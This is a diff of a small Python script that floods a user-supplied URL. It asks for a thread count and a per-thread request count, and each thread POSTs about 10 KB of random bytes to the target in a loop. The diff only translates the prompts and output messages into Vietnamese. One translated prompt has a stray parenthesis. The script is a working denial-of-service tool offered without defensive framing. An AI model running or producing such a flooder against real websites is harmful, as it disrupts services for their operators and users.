@@ -2,8 +2,8 @@ import requests
 import random
 import threading
 
-url = input("Enter URL: ")
-num_threads = int(input("Enter number of threads: "))
+url = input("Nhập URL: ")
+num_threads = int(input("Luồng (Threads: "))
 requests_per_thread = int(input("Enter number of requests per thread: "))
 
 def send_requests(thread_id):
@@ -11,7 +11,7 @@ def send_requests(thread_id):
         try:
             data = random._urandom(10) * 1000
             response = requests.post(url, data=data)
-            print(f"Thread {thread_id}: Sent {i + 1}, Status Code: {response.status_code}")
+            print(f"Thread {thread_id}: Đã gửi {i + 1}, Trạng thái code: {response.status_code}")
         except Exception as e:
             print(f"Thread {thread_id}: Error - {e}")
 
